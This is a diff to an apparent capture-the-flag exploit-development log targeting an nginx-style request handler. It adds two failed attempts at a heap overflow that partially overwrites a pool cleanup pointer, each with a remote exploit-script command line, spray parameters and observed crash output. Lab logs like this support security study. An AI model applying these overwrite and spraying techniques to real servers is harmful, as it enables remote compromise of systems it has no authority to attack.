@@ -351,3 +351,53 @@ target-len=2: hundreds URI-safe / thousands total
 ```
 
 Status: partial pass. Slot discovery works, but trying low-byte-safe slots without matching the victim cleanup pointer high bytes did not produce marker proof.
+
+## Core Slot Cleanup-Window Filter
+
+Purpose: avoid trying arbitrary low-2-byte-safe sprayed slots that cannot be reached by a partial overwrite of the victim cleanup pointer.
+
+Command:
+
+```bash
+./ctf_remote_exploit.py \
+  --host 192.168.1.89 --port 19321 \
+  --core-guided --target-len 2 \
+  --upload-victim --a-count 349 --plus-count 2600 \
+  --tries-per-candidate 1 --max-core-hits 20 --verbose
+```
+
+Observed:
+
+```text
+Core slot candidates: 737 URI-safe / 9940 total
+Cleanup-window filter: 4 plausible pools, 0 with probe low bytes, 125 matching safe slots
+No cleanup pointer with probe low bytes was found.
+First 20 filtered attempts: worker disruption, no marker proof.
+```
+
+Status: failed proof, useful negative signal. The core does not show evidence that the overwrite reached `pool->cleanup`.
+
+## Delayed Victim Body
+
+Purpose: test whether the overflow can corrupt victim request/pool metadata first, then let the later upload body register cleanup in the corrupted state.
+
+Command:
+
+```bash
+./ctf_remote_exploit.py \
+  --host 192.168.1.89 --port 19321 \
+  --core-guided --target-len 2 \
+  --upload-victim --delay-victim-body \
+  --a-count 128 --plus-count 2800 \
+  --tries-per-candidate 1 --max-core-hits 30 --verbose
+```
+
+Observed on tuned debug config:
+
+```text
+Core slot candidates: 940 URI-safe / 9940 total
+Cleanup-window filter: 2 plausible pools, 0 with probe low bytes, 0 matching safe slots
+gdb: SIGSEGV in ngx_http_request_handler() immediately after COPY_CAPTURE.
+```
+
+Status: failed proof. Delaying the body does not help while the overflow crashes the worker before cleanup allocation.
